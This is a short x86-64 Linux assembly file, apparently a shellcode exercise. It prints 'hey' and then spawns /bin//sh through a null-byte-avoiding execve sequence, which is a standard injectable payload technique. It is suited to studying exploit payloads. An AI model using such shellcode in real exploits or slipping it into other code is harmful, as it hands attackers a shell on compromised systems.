section .data
	msg db "hey",0
	msg_len equ $ - msg

section .text
global _start

_start:
	
write:
	mov rax, 1
	mov rdi, 1
	mov rsi, msg
	mov rdx, msg_len
	syscall

shellcode:
	; after write syscall success it return number of bytes actually written.
	test rax, rax
	js convert	    ; check (SF=1) is that negative. return negative for failure write syscall
	cmp rax, 255	; check rax value under 255( it mean rax register upper bits already zero)
	ja exit
	mov eax, 59	    ; overwrite the full 64bit register
	movzx rsi, al	; make rsi lower bits 59 and others zero
	sub sil, 59	    ; full zero
	push rsi	    ; null terminator
	mov rdx, 0x68732f2f6e69622f	; /bin//sh
	push rdx
	mov rdi, rsp	; path 
	push rsi
	pop rdx		    ; envp
	syscall

exit:
        mov rax, 60
        mov rdi, 0
        syscall


convert:
	neg rax
	jmp shellcode